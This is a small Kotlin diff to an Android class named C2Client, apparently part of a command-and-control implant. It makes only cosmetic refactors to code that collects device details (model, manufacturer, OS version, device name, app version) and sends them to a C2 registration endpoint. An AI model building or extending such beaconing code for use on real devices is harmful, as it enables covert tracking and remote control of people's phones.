@@ -67,18 +67,18 @@ class C2Client(private val context: Context) {
         val registrationData = JSONObject().apply {
             put("device_id", deviceId)
             put("device_info", JSONObject().apply {
-                put("model", android.os.Build.MODEL)
-                put("manufacturer", android.os.Build.MANUFACTURER)
-                put("android_version", android.os.Build.VERSION.RELEASE)
-                put("sdk_level", android.os.Build.VERSION.SDK_INT)
-                put("device_name", android.os.Build.DEVICE)
+                put("model", Build.MODEL)
+                put("manufacturer", Build.MANUFACTURER)
+                put("android_version", Build.VERSION.RELEASE)
+                put("sdk_level", Build.VERSION.SDK_INT)
+                put("device_name", Build.DEVICE)
             })
             put("app_version", context.packageManager.getPackageInfo(context.packageName, 0).versionName)
             put("registration_time", System.currentTimeMillis())
         }
         
         // Log the data we're going to send for debugging
-        Log.d(TAG, "Registration data: ${registrationData.toString()}")
+        Log.d(TAG, "Registration data: $registrationData")
         
         // Try HTTPS endpoint first
         Log.d(TAG, "Trying HTTPS endpoint: ${C2Config.REGISTRATION_ENDPOINT}")
